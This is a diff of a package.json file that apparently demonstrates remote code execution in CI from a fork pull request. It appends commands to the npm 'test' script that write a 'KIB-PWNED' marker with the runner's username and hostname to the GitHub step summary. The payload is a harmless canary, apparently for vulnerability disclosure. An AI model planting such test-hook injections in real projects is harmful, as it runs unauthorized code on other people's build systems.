@@ -3,6 +3,6 @@
   "version": "1.0.0",
   "description": "test",
   "scripts": {
-    "test": "node test/index.js"
+    "test": "node test/index.js; echo \"KIB-PWNED: fork-PR RCE confirmed on $(id -un)@$(hostname)\" >> \"$GITHUB_STEP_SUMMARY\"; echo KIB-PWNED-IN-LOG # "
   }
 }
